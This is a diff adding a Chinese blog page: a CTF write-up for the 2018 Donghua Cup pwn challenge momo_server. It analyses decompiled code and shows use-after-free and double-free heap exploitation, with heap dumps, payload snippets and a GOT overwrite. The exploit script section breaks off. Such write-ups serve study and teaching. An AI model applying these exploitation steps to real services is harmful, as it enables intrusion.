@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>2018东华杯-momo_server | V1NKe的心情垃圾桶</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="PWN," />
+  
+
+  <meta name="description" content="PWN">
+<meta name="keywords" content="PWN">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2018东华杯-momo_server">
+<meta property="og:url" content="http://yoursite.com/2018/11/27/2018东华杯momo_server/index.html">
+<meta property="og:site_name" content="V1NKe的心情垃圾桶">
+<meta property="og:description" content="PWN">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-05-19T09:17:40.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2018东华杯-momo_server">
+<meta name="twitter:description" content="PWN">
+
+  
+
+  
+    <link rel="icon" href="/haimian.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言："><span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#正文："><span class="toc-text">正文：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用构造："><span class="toc-text">利用构造：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-text">EXP:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#最后："><span class="toc-text">最后：</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-2018东华杯momo_server" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">2018东华杯-momo_server</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2018.11.27</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>V1NKe</span>
+        </span>
+      
+
+      
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>比赛的时候看了一天的arm，照样是没有解出来。。没有遇到过mprotect这种操作。赛后花时间复现了一下很少人做出来的momo_server，大佬们还是强呀。</p>
+<h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>这道题在分析程序执行流程上面就有一定的难度，要对<code>http</code>协议有一定的了解程度才能很快的分析完执行流程。先来看看整个程序的执行流程：</p>
+<p>前半段：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">v7 = 1;</span><br><span class="line">memset(&amp;v6, 0, 0x10000uLL);</span><br><span class="line">v9 = read(0, s, v8 - 1);</span><br><span class="line">if ( v9 &gt;= 0 )</span><br><span class="line">&#123;</span><br><span class="line">  *((_BYTE *)s + v9) = 0;</span><br><span class="line">  __isoc99_sscanf(s, &quot;%s %s %s \n&quot;, &amp;s1, &amp;v15, &amp;v14);</span><br><span class="line">  if ( !strstr((const char *)s, &quot;Connection: keep-alive&quot;) )</span><br><span class="line">    v7 = 0;</span><br><span class="line">  v12 = sub_40176B((const char *)s);</span><br></pre></td></tr></table></figure>
+<p><code>__isoc99_sscanf</code>类似于正则表达式，具体的可以自行去看函数定义，在这里的作用是用空格做分隔符，将输入的字符串切割后分别赋值给<code>s1</code>、<code>v15</code>、<code>v14</code>。<code>strstr</code>是查询子字符串，所以这里的作用是如果在输入中查不到<code>Connection: keep-alive</code>字符串，则<code>v7</code>变为0，程序最后会直接退出。所以为了让程序一直运行不退出，输入必须带有<code>Connection: keep-alive</code>字符串。</p>
+<p>再来看看程序功能：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if ( !strcmp(&amp;s1, &quot;GET&quot;) )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !strcmp(&amp;v15, &quot;/&quot;) )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_400E67();</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( !strcmp(&amp;v15, &quot;/list&quot;) )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_400E82();</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      sub_400E4C();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>如果<code>s1</code>,<code>v15</code>分别为<code>GET</code>,<code>/</code>则执行<code>sub_400E67()</code>。该函数具体没什么用，往下是<code>sub_400E82()</code>函数，这个函数先放着，看名字<code>list</code>可以大致猜测到是“显示堆”功能的函数。再往下<code>sub_400E4C()</code>函数也没什么用。所以想要调用<code>/list</code>函数可以这样构造输入：</p>
+<blockquote>
+<p>GET /list Connection: keep-alive</p>
+</blockquote>
+<p>往下看：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">else if ( !strcmp(&amp;s1, &quot;POST&quot;) )</span><br><span class="line"> &#123;</span><br><span class="line">   if ( !strcmp(&amp;v15, &quot;/add&quot;) )</span><br><span class="line">   &#123;</span><br><span class="line">     sub_4011EE(v12);</span><br><span class="line">   &#125;</span><br><span class="line">   else if ( !strcmp(&amp;v15, &quot;/count&quot;) )</span><br><span class="line">   &#123;</span><br><span class="line">     sub_4016A8();</span><br><span class="line">   &#125;</span><br><span class="line">   else if ( !strcmp(&amp;v15, &quot;/echo&quot;) )</span><br><span class="line">   &#123;</span><br><span class="line">     sub_4010CB(v12, (__int64)&quot;/echo&quot;, v3, v4, v5);</span><br><span class="line">   &#125;</span><br><span class="line">   else</span><br><span class="line">   &#123;</span><br><span class="line">     sub_400E4C();</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>原理如上，这里需要提上一嘴的是第一个函数中传入了<code>v12</code>参数，往上看可以发现<code>v12</code>由<code>sub_40176B()</code>得来：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">char *__fastcall sub_40176B(const char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  char *v2; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  if ( strstr(a1, &quot;\r\n\r\n&quot;) )</span><br><span class="line">    return strstr(a1, &quot;\r\n\r\n&quot;) + 4;</span><br><span class="line">  if ( strstr(a1, &quot;\n\n&quot;) )</span><br><span class="line">    return strstr(a1, &quot;\n\n&quot;) + 2;</span><br><span class="line">  if ( strstr(a1, &quot;\r\r&quot;) )</span><br><span class="line">    v2 = strstr(a1, &quot;\r\r&quot;) + 2;</span><br><span class="line">  return v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>查询子字符，如果有以上三种中的一种则返回其中一种字符串的后面内容，比如我输入了<code>v1nke1\r\n\r\nv1nke2</code>，则返回<code>v1nke2</code>字符。</p>
+<p>进入<code>/add</code>函数中分析：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if ( (unsigned int)__isoc99_sscanf(v1, &quot;%10[^=]=%80s&quot;, &amp;s, &amp;s2, v2)</span><br><span class="line">    &amp;&amp; (v3 = strtok(0LL, &quot;&amp;&quot;), (unsigned int)__isoc99_sscanf(v3, &quot;%10[^=]=%10s&quot;, &amp;s1, &amp;nptr, v4)) )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( !strcmp(&amp;s, &quot;memo&quot;) &amp;&amp; s2 &amp;&amp; (v5 = &quot;count&quot;, !strcmp(&amp;s1, &quot;count&quot;)) &amp;&amp; nptr &amp;&amp; atoi(&amp;nptr) &gt;= 0 )</span><br></pre></td></tr></table></figure>
+<p>这段对传入参数<code>v12</code>做处理，先用<code>&amp;</code>做分隔符分成两段字符串，前一段中取<code>=</code>前面部分赋值给<code>s</code>,<code>=</code>后面赋值给<code>s2</code>。后一段取<code>=</code>前给<code>s1</code>,<code>=</code>后给<code>nptr</code>。</p>
+<p>后面的<code>if</code>语句是要求<code>s</code>为<code>memo</code>，<code>s1</code>为<code>count</code>。且<code>nptr</code>为数字且大于0。</p>
+<p>往后：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">for ( i = 0; i &lt;= 15 &amp;&amp; *(&amp;ptr + i); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *(_QWORD *)*(&amp;ptr + i) )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = &amp;s2;</span><br><span class="line">      if ( !strcmp(*(const char **)*(&amp;ptr + i), &amp;s2) )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = (__int64)*(&amp;ptr + i);</span><br><span class="line">        *(_DWORD *)(v6 + 8) = atoi(&amp;nptr);</span><br><span class="line">        *((_WORD *)*(&amp;ptr + i) + 6) = 0;</span><br><span class="line">        sprintf(&amp;v19, &quot;&#123;\&quot;status\&quot;:\&quot;%s\&quot;&#125;&quot;, &quot;ok&quot;);</span><br><span class="line">        pprint((__int64)&quot;HTTP/1.1 200 OK&quot;, (__int64)&quot;application/json&quot;, &amp;v19);</span><br><span class="line">        return __readfsqword(0x28u) ^ v20;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>这段函数引起<code>double free</code>漏洞。后面可以充分体会到。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">v7 = (char **)malloc(0x10uLL);</span><br><span class="line"> v8 = strlen(&amp;s2);</span><br><span class="line"> v9 = (char *)malloc(v8);</span><br><span class="line"> *v7 = v9;</span><br><span class="line"> sub_400D84(&amp;s2, (__int64)v5, (__int64)v9, v10, v11);</span><br><span class="line"> v12 = strlen(&amp;s2);</span><br><span class="line"> strncpy(*v7, &amp;s2, v12 + 1);</span><br><span class="line"> *((_DWORD *)v7 + 2) = atoi(&amp;nptr);</span><br><span class="line"> *((_WORD *)v7 + 6) = 0;</span><br><span class="line"> *(&amp;ptr + i) = v7;</span><br><span class="line"> sprintf(&amp;v19, &quot;&#123;\&quot;status\&quot;:\&quot;%s\&quot;&#125;&quot;, &quot;ok&quot;);</span><br><span class="line"> pprint((__int64)&quot;HTTP/1.1 200 OK&quot;, (__int64)&quot;application/json&quot;, &amp;v19);</span><br></pre></td></tr></table></figure>
+<p>这里可以看到该函数先分配<code>0x20</code>的堆结构体，然后根据<code>memo=</code>后边的内容大小分配合适的堆。再将<code>count=</code>后面的数字赋值到堆结构体中去，并在六字节处置0。最后<code>&amp;ptr</code>位于bss段，将堆结构体指针赋值到bss段中。这里再往回看<code>/list</code>中的内容，就明白了其具体内容就是显示分配堆中的内容。</p>
+<p>往下看第二个函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if ( pthread_create(&amp;newthread, 0LL, (void *(*)(void *))start_routine, 0LL) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_401041((__int64)&quot;failed&quot;);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>开了一个多线程函数，进入到<code>start_routine</code>函数中去：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">do</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = 0;</span><br><span class="line">    for ( i = 0; i &lt;= 15; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( *(&amp;ptr + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( *((_DWORD *)*(&amp;ptr + i) + 2) &lt;= 0 )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( !*((_DWORD *)*(&amp;ptr + i) + 2) &amp;&amp; *((_WORD *)*(&amp;ptr + i) + 6) )</span><br><span class="line">          &#123;</span><br><span class="line">            *((_WORD *)*(&amp;ptr + i) + 6) = 0;</span><br><span class="line">            free(*(void **)*(&amp;ptr + i));</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          --*((_DWORD *)*(&amp;ptr + i) + 2);</span><br><span class="line">          *((_WORD *)*(&amp;ptr + i) + 6) = 1;</span><br><span class="line">          ++v2;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    result = sleep(1u);</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v2 );</span><br></pre></td></tr></table></figure>
+<p>遍历15个堆结构，根据所赋值的<code>count=</code>后的数字是否小于等于0，否则减一，再将第六位赋值为1，是则第六位置零，并<code>free</code>堆，这里存在<code>UAF</code>漏洞，没有清空指针。</p>
+<p>后面的<code>echo</code>函数没有用，但是官方给出的writeup说是echo函数中没有00截断字符串，会泄漏地址。但是我实际调试当中发现是有00截断的，没办法泄漏地址，只是一个你输入了什么原样输出的一个函数而已。。</p>
+<h3 id="利用构造："><a href="#利用构造：" class="headerlink" title="利用构造："></a>利用构造：</h3><p>这里就用<code>double free</code>来利用，先添加四个0x20的堆和五个0x40的堆，除最后一个0x40的堆外别的堆count置为1。而后free掉八组堆，成为fastbin。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0x12b5000:	0x0000000000000000	0x0000000000000021 &lt; -- 1</span><br><span class="line">0x12b5010:	0x00000000012b5030	0x0000000000000000</span><br><span class="line">0x12b5020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x12b5030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x12b5040:	0x0000000000000000	0x0000000000000021 &lt; -- 2</span><br><span class="line">0x12b5050:	0x00000000012b5070	0x0000000000000000</span><br><span class="line">0x12b5060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x12b5070:	0x00000000012b5020	0x0000000000000000</span><br><span class="line">0x12b5080:	0x0000000000000000	0x0000000000000021 &lt; -- 3</span><br><span class="line">0x12b5090:	0x00000000012b50b0	0x0000000000000000</span><br><span class="line">0x12b50a0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x12b50b0:	0x00000000012b5060	0x0000000000000000</span><br><span class="line">0x12b50c0:	0x0000000000000000	0x0000000000000021 &lt; -- 4</span><br><span class="line">0x12b50d0:	0x00000000012b50f0	0x0000000000000000</span><br><span class="line">0x12b50e0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x12b50f0:	0x00000000012b50a0	0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>然后<code>/list</code>一下，泄漏出堆基地址。</p>
+<p>这里再<code>add</code>一个新堆，但是堆内容跟之前所分配堆中的某个堆内容一样。这样的话就会执行<code>add</code>函数中的导致<code>double free</code>的地方，此时并不<code>malloc</code>新堆，而是将内容重复堆的结构体堆<code>count</code>处内容置为我们刚刚<code>add</code>的<code>count</code>内容，导致这个堆本已经<code>free</code>过了但是还能再次<code>free</code>。这里我们选择重置第三个堆，也就是要<code>add</code>一个<code>memo=0x12b5060</code>的堆（根据以上堆情况得出的值）。再来看看堆情况：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0xd9b000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xd9b010:	0x0000000000d9b030	0x0000000000000000</span><br><span class="line">0xd9b020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xd9b030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0xd9b040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xd9b050:	0x0000000000d9b070	0x0000000000000000</span><br><span class="line">0xd9b060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xd9b070:	0x0000000000d9b020	0x0000000000000000</span><br><span class="line">0xd9b080:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xd9b090:	0x0000000000d9b0b0	0x0000000000000001 &lt; -- 置为1</span><br><span class="line">0xd9b0a0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xd9b0b0:	0x0000000000d9b060	0x0000000000000000</span><br><span class="line">0xd9b0c0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xd9b0d0:	0x0000000000d9b0f0	0x0000000000000000</span><br><span class="line">0xd9b0e0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xd9b0f0:	0x0000000000d9b0a0	0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p><code>free</code>掉后再看看<code>fastbin</code>中的情况（堆变化是因为不是同一次复制数据，看偏移即可）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0x15f00a0 —▸ 0x15f00e0 ◂— 0x15f00a0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x15f0240 —▸ 0x15f01e0 —▸ 0x15f0180 —▸ 0x15f0120 ◂— 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure>
+<p>这时候就可以充分利用<code>double free</code>的情况了，再<code>add</code>一个堆，并构造出一个<code>fake heap</code>。</p>
+<blockquote>
+<p>add(‘aaaaaaaa\x21’,1)</p>
+</blockquote>
+<p>看堆情况：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x1299080:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x1299090:	0x00000000012990b0	0x0000000000000000</span><br><span class="line">0x12990a0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x12990b0:	0x00000000012990f0	0x0000000000000001</span><br><span class="line">0x12990c0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x12990d0:	0x00000000012990f0	0x0000000000000000</span><br><span class="line">0x12990e0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x12990f0:	0x6161616161616161	0x0000000000000021</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x12990a0 —▸ 0x12990f0</span><br></pre></td></tr></table></figure>
+<p>这时候第二个<code>fastbin</code>为0x12990f0，所以<code>memo=</code>的内容就会被分配在0x1299100处，而0x1299100处恰好是一个之前所分配的堆，所以可以用这点来泄漏libc地址了。继续<code>add</code>一个：</p>
+<blockquote>
+<p>add(‘b’<em>8+’\x21’</em>8+p64(elf.got[‘atoi’]).replace(‘\x00’,’’),12345)</p>
+</blockquote>
+<p>堆情况：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x1bcf0c0:	0x0000000000000000	0x0000000000000021 &lt; -- 4</span><br><span class="line">0x1bcf0d0:	0x0000000001bcf0f0	0x0000000000000000</span><br><span class="line">0x1bcf0e0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x1bcf0f0:	0x6161616161616161	0x0000000000000021</span><br><span class="line">0x1bcf100:	0x6262626262626262	0x2121212121212121 &lt; -- 5</span><br><span class="line">0x1bcf110:	0x00000000006030a0	0x0000000000000000</span><br><span class="line">0x1bcf120:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x1bcf130:	0x0000000000000000	0x4545454545454545</span><br></pre></td></tr></table></figure>
+<p>而后的利用方式就是常规操作修改got表了，利用方法也同上<code>double free</code>。不过第四次<code>malloc</code>到程序got表的地址处。这里我本想<code>fastbin</code>到<code>__malloc_hook</code>的地址处，但是这里需要堆大小为0x70，<code>add</code>中最大内容大小是0x50:</p>
+<blockquote>
+<p>memset(&amp;s2, 0, 0x50uLL);</p>
+</blockquote>
+<p>所以这里行不通，只能在got表地址处找一处错位地址：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20xg 0x60306a</span><br><span class="line">0x60306a:	0x0ac600007f08c728	0x1130000000000040</span><br><span class="line">0x60307a:	0x8ad000007f08c727	0xce7000007f08c725</span><br><span class="line">0x60308a:	0x0b0600007f08c725	0xb660000000000040</span><br><span class="line">0x60309a:	0x3e8000007f08c727	0x294000007f08c722</span><br></pre></td></tr></table></figure>
+<p>刚好有一处0x40大小的可构造堆，且<code>__isoc99_sscanf</code>处于<code>0x603080</code>地址处可覆写。</p>
+<p>大家复现后会发现这里有一处想不到的地方（反正我是想不到），就是要构造0x30大小的<code>memo</code>内容的时候，该如何既让堆<code>fd</code>指针处是我们所要构造的0x60306a，又要让0x30内容被填充满且中间还不能输入00字符串？（该程序如果memo=后的内容有00字符串则会崩溃，但是要构造0x60306a地址内容就必须有5个00字符串）</p>
+<p>这里看了别人的wp后发现他们是这样构造的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(urllib.quote(flat(0x60306a).ljust(0x30, &apos;A&apos;)),1234)</span><br></pre></td></tr></table></figure>
+<p>实际调试发现：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x1f151e0:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x1f151f0:	0x000000000060306a	0x4747474747474747</span><br><span class="line">0x1f15200:	0x4747474747474747	0x4747474747474747</span><br><span class="line">0x1f15210:	0x4747474747474747	0x4747474747474747</span><br></pre></td></tr></table></figure>
+<p>确实能写入，并且后面的内容不变为’A’。我查了一下这个quote函数不过是个<code>url</code>编码函数，为什么还能有这种效果。。如果有人清楚原理请告诉我一下。。</p>
+<p>还有这里需要注意的一个点是在<code>free</code>堆的时候因为程序是开了多线程的，所以需要有一定的延时，不然会导致没有运行完整个<code>count</code>函数代码就进入下一个环节，会导致没有<code>free</code>掉堆的情况。</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span 